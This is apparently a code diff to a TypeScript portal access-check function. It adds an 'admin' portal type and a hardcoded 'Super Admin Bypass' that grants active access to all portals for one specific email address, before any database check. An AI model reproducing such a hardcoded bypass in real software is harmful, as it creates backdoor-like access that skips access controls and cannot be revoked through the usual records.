@@ -1,6 +1,6 @@
 import { listTable, patchRecord } from "./insforge-crud";
 
-export type PortalType = "partner" | "rider" | "manager" | "logistics";
+export type PortalType = "partner" | "rider" | "manager" | "logistics" | "admin";
 export type PortalStatus = "active" | "disabled";
 
 export type PortalAccessRow = {
@@ -32,6 +32,12 @@ export async function checkPortalAccess(
 ): Promise<AccessCheckResult> {
   const normalizedEmail = normalize(email);
   if (!normalizedEmail) return { ok: false, reason: "not_found" };
+
+  // Super Admin Bypass - Permanent access to all portals
+  const SUPER_ADMIN = "scoobix.info@gmail.com";
+  if (normalizedEmail === SUPER_ADMIN) {
+    return { ok: true, status: "active" };
+  }
 
   try {
     const rows = await listTable<PortalAccessRow>(
